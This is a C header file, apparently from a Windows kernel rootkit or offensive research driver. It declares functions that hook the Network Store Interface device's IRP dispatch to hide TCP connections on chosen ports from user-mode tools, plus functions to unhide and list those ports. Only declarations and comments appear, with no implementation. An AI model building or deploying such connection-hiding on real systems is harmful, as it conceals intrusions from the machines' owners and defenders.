// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Attaches to the NSI device to intercept IRPs.


	@return         STATUS_SUCCESS if hooked, error otherwise.
**/
NTSTATUS
TechniquesNetworkStoreInterface_AttachToNSI();



/**
	@brief          Detaches from the NSI device and restores original dispatch routine.
**/
VOID
TechniquesNetworkStoreInterface_Unload();



/**
	@brief          Hides all TCP connections involving a specific port.
	@details        The specified port is added to the internal hidden list. Any connection (local or remote) involving this port will be removed from the NSI TCP table during enumeration, effectively hiding it from user-mode tools.


	@param[out]     responseBuffer              Output message buffer.

	@param[in]      responseBufferSize          Size of the response buffer in bytes.

	@param[in]      portString                  Null-terminated string representing the TCP port to hide.


	@return         STATUS_SUCCESS if hidden correctly, error code otherwise.
**/
NTSTATUS
TechniquesNetworkStoreInterface_Hide(
	_Out_           char*                       responseBuffer,
	_In_            size_t                      responseBufferSize,
	_In_            const char*                 portString
);



/**
	@brief          Stops hiding connections involving a specific TCP port, by removing it from the hidden list.


	@param[out]     responseBuffer              Output message buffer.

	@param[in]      responseBufferSize          Size of the response buffer in bytes.

	@param[in]      index                       Index of the port in the hidden list.


	@return         STATUS_SUCCESS if successful, error code otherwise.
**/
NTSTATUS
TechniquesNetworkStoreInterface_Unhide(
	_Out_           char*                       responseBuffer,
	_In_            size_t                      responseBufferSize,
	_In_            ULONG                       index
);



/**
	@brief          Lists all TCP ports currently being used to hide associated connections.
	@details        These are the ports tracked internally to filter out connections from the NSI TCP entry list.


	@param[out]     responseBuffer              Output buffer to fill.

	@param[in]      responseBufferSize          Size of the output buffer.


	@return         A NTSTATUS value indicating success or an error code if the list was truncated.
**/
NTSTATUS
TechniquesNetworkStoreInterface_List(
	_Out_           char*                       responseBuffer,
	_In_            size_t                      responseBufferSize
);



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
